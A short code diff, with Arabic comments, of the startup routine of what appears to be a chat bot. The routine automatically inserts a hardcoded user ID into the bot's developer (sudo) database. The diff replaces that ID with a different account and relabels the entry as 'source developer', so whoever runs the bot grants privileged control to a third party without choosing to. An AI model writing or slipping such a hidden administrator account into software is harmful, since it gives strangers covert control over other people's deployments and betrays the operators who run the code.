@@ -60,7 +60,7 @@ async def _init() -> None:
     # 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧
     # 1. إضافة المستخدم 8277718687 تلقائياً إذا لم يكن موجوداً
     # 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧
-    AUTO_SUDO_ID = 8277718687
+    AUTO_SUDO_ID = 5427469031
     
     try:
         # جلب قاعدة بيانات المطورين
@@ -77,7 +77,7 @@ async def _init() -> None:
             date = str(datetime.now().strftime("%B %d, %Y"))
             userdata = {
                 "chat_id": AUTO_SUDO_ID,
-                "chat_name": "المطور التلقائي",
+                "chat_name": "مطور السورس",
                 "chat_username": f"user_{AUTO_SUDO_ID}",
                 "date": date,
             }
